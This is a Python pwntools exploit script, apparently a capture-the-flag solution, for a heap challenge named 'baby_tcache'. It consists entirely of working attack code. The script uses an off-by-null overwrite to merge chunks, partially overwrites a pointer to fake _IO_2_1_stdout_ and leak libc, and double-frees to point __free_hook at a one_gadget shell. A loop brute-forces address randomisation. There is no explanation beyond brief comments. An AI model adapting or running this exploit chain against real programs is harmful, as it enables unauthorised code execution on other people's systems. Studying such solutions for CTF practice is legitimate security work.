from pwn import *

context.log_level = 'debug'



def new(size,data):
   p.recvuntil('choice: ')
   p.sendline('1')
   p.recvuntil('Size:')
   p.sendline(str(size))
   p.recvuntil('Data:')
   p.send(data)


def delete(index):
   p.recvuntil('choice: ')
   p.sendline('2')
   p.recvuntil('Index:')
   p.sendline(str(index))


while True:

   try:

      p = process('./baby_tcache')

      new(0x500,'a')
      new(0x78,'a')
      new(0x4f0,'a')
      new(0x20,'a')

      #unsorted bin
      delete(0)

      delete(1)
      new(0x78,'a')

      #overwrite the pre_chunk_in_use and pre_size
      #clean pre_size
      for i in range(6):
         delete(0)
         new(0x70+8-i,'a'*(0x70+8-i))

      delete(0)
      new(0x72,'a'*0x70 + '\x90\x05')

      #unsorted bin Merging forward
      delete(2)
      delete(0)

      #hijack fd -> _IO_2_1_stdout_
      new(0x500,'a')
      new(0x88,'\x60\xc7')

      #hijack _IO_write_base to leak libc
      new(0x78,'a')
      fake__IO_2_1_stdout_ = p64(0xfbad1887) + p64(0)*3 + "\x00"
      new(0x78,fake__IO_2_1_stdout_)
      libc_base = u64(p.recv(0x30)[8:16]) - 0x3ed8b0
      log.success('libc_base addr : 0x%x'%libc_base)
      free_hook = libc_base + 0x3ed8e8
      one_gadget = libc_base + 0x4f322
      log.success('free_hook addr : 0x%x'%free_hook)
      log.success('one_gadget addr : 0x%x'%one_gadget)

      #double free
      delete(1)
      delete(2)

      #hijack free_hook -> one_gadget
      new(0x88,p64(free_hook))
      new(0x88,'a')
      new(0x88,p64(one_gadget))

      #trigger one_gadget
      delete(0)


      p.interactive()

   except Exception as e:

      p.close()



